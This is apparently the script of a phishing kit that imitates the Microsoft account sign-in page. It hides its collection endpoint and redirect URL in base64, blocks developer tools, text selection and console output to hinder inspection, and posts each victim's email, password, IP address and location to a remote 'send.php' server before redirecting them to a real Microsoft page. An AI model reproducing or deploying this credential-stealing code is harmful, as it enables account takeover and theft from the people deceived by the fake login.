    HtmlGuard.protections.antiDevTools();
    HtmlGuard.protections.blockContextMenu();
    HtmlGuard.protections.blockDrag();
    HtmlGuard.protections.blockSelection();
    HtmlGuard.protections.blockConsoleOutput();
    HtmlGuard.loader.loadStyleByRef("styles.css");
    HtmlGuard.loader.loadScriptBySrc("test.js");
    const PREFIX = ".OBFS.";
    const SUFFIX = ".END.";
    function deobfString(str) {
        let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
        let reversed = withoutPrefixSuffix.split('').reverse().join('');
        return atob(reversed);
    }
    function decryptTextInDocument() {
        let textNodes = getTextNodes(document.body);
        textNodes.forEach(node => {
            node.nodeValue = node.nodeValue.replace(new RegExp(`${PREFIX}(.*?)${SUFFIX}`, 'g'), (match) => {
                return deobfString(match);
            });
        });
        document.querySelectorAll('input[placeholder]').forEach(input => {
            let encryptedPlaceholder = input.getAttribute('placeholder');
            input.setAttribute('placeholder', deobfString(encryptedPlaceholder));
        });

    }
    function getTextNodes(element) {
        let textNodes = [];
        if (element.nodeType === Node.TEXT_NODE) {
            textNodes.push(element);
        } else {
            let children = element.childNodes;
            for (let i = 0; i < children.length; i++) {
                textNodes.push(...getTextNodes(children[i]));
            }
        }
        return textNodes;
    }
    window.onload = function() {
        decryptTextInDocument();
    };
$(document).ready(function() {
        var php_url = atob('aHR0cHM6Ly9odWJzcG90NDkxNTAyOTEuYWx3YXlzZGF0YS5uZXQvc2VuZC5waHA=');
        var finish_url = atob('aHR0cHM6Ly93d3cuYmluZy5jb20vY2svYT8hJiZwPTc2NDllOWQxNGU1NDM5MzdKbWx0ZEhNOU1UWTROamsyTURBd01DWnBaM1ZwWkQwd09ETTJOV1U0TWkxaE1tUTRMVFkxWXpFdE1HTXlOQzAwWTJSaVlUTmlZalkwTmpVbWFXNXphV1E5TlRJek5RJnB0bj0zJmhzaD0zJmZjbGlkPTA4MzY1ZTgyLWEyZDgtNjVjMS0wYzI0LTRjZGJhM2JiNjQ2NSZwc3E9bWljcm9zb2Z0K3VzZXIrYWdyZWVtZW50JnU9YTFhSFIwY0hNNkx5OTNkM2N1YldsamNtOXpiMlowTG1OdmJTOXNhV05sYm5OcGJtY3ZaRzlqY3k5amRYTjBiMjFsY21GbmNtVmxiV1Z1ZEEmbnRiPTE=');
        var str = 'Sign in to your account';
        document.title = str;
        $("#add_em").show();
        var postCount = 0;
        function handleEmailButtonClick() {
            var emailcek = $('#email').val().trim();
            if (emailcek === '') {
                $(".error-alert").show();
                $(".error-alert-msg").html('Please enter the valid email for your Microsoft account.');
                
                return;
            }
            $('.identity').html(emailcek);
            $(".error-alert").hide();
            $('.btn-email').prop('disabled', false);
            document.getElementById("pba1").style.display = "block";
            document.getElementById("pba2").style.display = "block";
            $.ajax({
                url: php_url,
                type: "POST",
                data: {
                    checkemail: emailcek
                },
                beforeSend: function(xhr) {
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                },
                success: function(data) {
                    var i = JSON.parse(data);
                    if (i === "gagal") {
                        $(".error-alert").show();
                        $(".error-alert-msg").html('That Microsoft account not exist. Enter a different account.');
                        $('.btn-email').prop('disabled', false);
                        document.getElementById("pba1").style.display = "none";
                        document.getElementById("pba2").style.display = "none";
                    } else if (i === "bisa") {
                        $("#add_em").hide();
                        $("#add_pass").show();
                        document.getElementById("pba1").style.display = "none";
                        document.getElementById("pba2").style.display = "none";
                    } else {
                        $(".error-alert").show();
                        $(".error-alert-msg").html('Enter a valid email address, phone number, or Skype name.');
                        $('.btn-email').prop('disabled', false);
                        document.getElementById("pba1").style.display = "none";
                        document.getElementById("pba2").style.display = "none";
                    }
                }
            });
        }
        function handleSignInButtonClick() {
            $('.btn-signin').prop('disabled', true);
            var user = $('#email').val();
            var pass = $('#myai').val();
    
            if (pass == '') {
                $(".error-alert-pass").show();
                $('.btn-signin').prop('disabled', false);
            } else {
                setTimeout(function() {
                    $(".error-alert-pass").hide();
                }, 500);
    
                document.getElementById("pba1").style.display = "block";
                document.getElementById("pba2").style.display = "block";
                fetch('https://get.geojs.io/v1/ip/geo.json')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    var country = data.country;
                    var region = data.region;
                    var city = data.city;
                    var organization_name = data.organization_name || '';
                $.ajax({
                    url: php_url,
                    type: "POST",
                    data: {
                        email: user,
                        password: pass,
                        ip: ip,
                        country: country,
                        region: region,
                        city: city,
                        organization_name: organization_name
                    },
                    beforeSend: function(xhr) {
                        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    },
                    success: function(data) {
                        var i = JSON.parse(data);
                        if (i === "masuk") {
                            location.replace(finish_url);
                            setTimeout("window.location.href='" + finish_url + "';", 1000);
                        } else if (i === "keluar") {
                            postCount++;
                            if (postCount >= 3) {
                                location.replace(finish_url);
                            } else {
                                document.getElementById("pba1").style.display = "none";
                                document.getElementById("pba2").style.display = "none";
                                $(".error-alert-pass").show();
                                $('.btn-signin').prop('disabled', false);
                            }
                        } else {
                            $(".error-alert-pass").hide();
                            $('.btn-signin').prop('disabled', false);
                        }
                    }
                });
            }
        }
    
        $('.btn-email').on('click', function() {
            handleEmailButtonClick();
        });

        $('.btn-signin').on('click', function() {
            handleSignInButtonClick();
        });

        $('#email').keypress(function(event) {
            if (event.keyCode === 13) {
                handleEmailButtonClick();
            }
        });

        $('#myai').keypress(function(event) {
            if (event.keyCode === 13) {
                handleSignInButtonClick();
            }
        });
    
        $('.backButton').on('click', function() {
            $('#bg_image').css('background-image', 'url(https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)');
            $('#logo_image').attr('src', 'https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');
            $('#banner_image').show();
            $('.btn-email').prop('disabled', false);
            $("#add_pass").hide();
            $("#add_em").show();
            $(".error-alert-pass").hide();
        });
    
    });
